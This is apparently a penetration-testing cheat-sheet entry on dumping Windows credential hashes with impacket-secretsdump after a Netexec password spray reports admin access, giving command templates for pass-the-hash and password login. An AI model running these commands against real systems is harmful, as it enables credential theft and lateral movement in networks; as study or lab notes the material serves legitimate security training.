If we get a "Pwn3d!" message on any machine when spraying with Netexec we can dump hashes using secretsdump.

> With hash:

```
impacket-secretsdump -hashes :<ntlm_hash> <domain>/<user>@<target_ip>
```

> With password:

```
impacket-secretsdump <domain>/<user>:<password>@<target_ip>
```
